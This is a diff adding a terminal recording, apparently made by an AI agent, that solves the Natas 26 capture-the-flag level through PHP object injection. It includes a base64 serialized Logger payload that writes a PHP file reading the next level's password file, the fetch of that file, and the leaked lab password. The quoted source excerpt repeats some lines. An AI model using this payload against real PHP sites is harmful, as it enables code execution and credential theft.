@@ -1,0 +1,11 @@
+{"version":3,"term":{"cols":100,"rows":32},"timestamp":1793510756,"idle_time_limit":2.0,"command":"bash /home/claude/solves/natas/L26.sh","title":"Natas L26 -> natas27: PHP object injection - Logger __destruct writes a .php into img/","env":{"SHELL":"/bin/bash"}}
+[0.003, "o", "$ curl -s -u natas26:<pw> http://natas26.natas.labs.overthewire.org/index-source.html\r\n$   class Logger: __construct writes initMsg to logFile, __destruct writes exitMsg\r\n"]
+[0.000, "o", "$   drawing cookie -> unserialize(base64_decode($_COOKIE[\"drawing\"]))\r\n$   -> PHP object injection: we control the class name and every property\r\n"]
+[0.671, "o", "class Logger{\r\nprivate $logFile;\r\nprivate $initMsg;\r\nprivate $exitMsg;\r\nfunction __construct($file){\r\n$this->logFile = \"/tmp/natas26_\" . $file . \".log\";\r\n$fd=fopen($this->logFile,\"a+\");\r\n$fd=fopen($this->logFile,\"a+\");\r\nfunction __destruct(){\r\n$fd=fopen($this->logFile,\"a+\");\r\n$drawing=unserialize(base64_decode($_COOKIE[\"drawing\"]));\r\n$drawing=unserialize(base64_decode($_COOKIE[\"drawing\"]));\r\n"]
+[0.000, "o", "$ 1. start a session so we know session_id() -> the image path uses it:\r\n"]
+[0.396, "o", "   PHPSESSID=u7ekpeu5rdisg2eo8nbpsolcft\r\n$ 2. build a serialized Logger whose logFile is a .php inside img/ and whose\r\n$    exitMsg is PHP code (written by __destruct at end of request):\r\n"]
+[0.010, "o", "   drawing=Tzo2OiJMb2dnZXIiOjM6e3M6MTU6IgBMb2dnZXIAbG9nRmlsZSI7czo0MjoiaW1nL25hdGFzMjZfdTdla3BldTVyZGlzZzJlbzhuYnBzb2xjZnQucGhwIjtzOjE1OiIATG9nZ2VyAGluaXRNc2ciO3M6MDoiIjtzOjE1OiIATG9nZ2VyAGV4aXRNc2ciO3M6NjI6Ijw/cGhwIGVjaG8gZmlsZV9nZXRfY29udGVudHMoJy9ldGMvbmF0YXNfd2VicGFzcy9uYXRhczI3Jyk7ID8+Ijt9\r\n$ 3. send it: drawImage() calls drawFromUserdata(), which unserializes the cookie\r\n"]
+[0.415, "o", "$ 4. fetch the PHP file the destructor wrote (it lives in img/, which is served):\r\n$ curl -s -u natas26:<pw> http://natas26.natas.labs.overthewire.org/img/natas26_u7ekpeu5rdisg2eo8nbpsolcft.php\r\n"]
+[0.379, "o", "mj2mBEPWycXTTg5BXYT7UPXgXHx5hjvV\r\nmj2mBEPWycXTTg5BXYT7UPXgXHx5hjvV\r\n"]
+[0.001, "o", "$ verify: curl -u natas27:<pw> http://natas27.natas.labs.overthewire.org/ -> 200\r\n"]
+[0.000, "x", "0"]
